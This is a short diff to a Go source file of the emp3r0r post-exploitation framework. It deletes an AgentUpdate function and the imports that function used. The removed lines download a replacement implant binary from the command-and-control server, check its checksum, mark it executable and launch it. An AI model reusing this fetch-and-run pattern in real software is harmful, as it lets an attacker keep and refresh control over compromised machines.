@@ -7,15 +7,12 @@ import (
 	"net"
 	"net/url"
 	"os"
-	"os/exec"
 	"strings"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
-	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -64,31 +61,6 @@ func CheckAgentAlive(c net.Conn) bool {
 	}
 
 	return false
-}
-
-// AgentUpdate agent from https://ccAddress/agent
-func AgentUpdate(checksum string) (out string) {
-	tempfile := common.RuntimeConfig.AgentRoot + "/" + util.RandStr(util.RandInt(5, 15))
-	_, err := c2transport.FetchFile("", "agent", tempfile, checksum)
-	if err != nil {
-		return fmt.Sprintf("Error: Download agent: %v", err)
-	}
-	download_checksum := crypto.SHA256SumFile(tempfile)
-	if checksum != download_checksum {
-		return fmt.Sprintf("Error: checksum mismatch: %s expected, got %s", checksum, download_checksum)
-	}
-	err = os.Chmod(tempfile, 0o755)
-	if err != nil {
-		return fmt.Sprintf("Error: chmod %s: %v", tempfile, err)
-	}
-	cmd := exec.Command(tempfile)
-	cmd.Env = append(os.Environ(), "REPLACE_AGENT=true")
-	err = cmd.Start()
-	if err != nil {
-		return fmt.Sprintf("Error: %v", err)
-	}
-
-	return fmt.Sprintf("Agent started with PID %d", cmd.Process.Pid)
 }
 
 // set C2Transport string
